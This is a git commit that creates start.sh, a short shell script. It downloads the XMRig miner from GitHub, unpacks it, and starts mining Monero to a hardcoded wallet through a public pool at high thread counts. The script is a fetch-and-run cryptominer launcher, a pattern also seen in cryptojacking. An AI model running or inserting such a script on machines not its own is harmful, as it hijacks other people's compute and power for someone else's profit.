f4da35cd0b2009512f441e066ce255a5d4f7898e
LykCloud <145738195+LykCloud@users.noreply.github.com>
2023-12-10 15:32:16 +0530

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,7 @@
+curl -LO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+
+tar -xf xmrig-6.21.0-linux-x64.tar.gz
+
+cd xmrig-6.21.0
+
+./xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero --threads 50 --max-cpu-usage 50
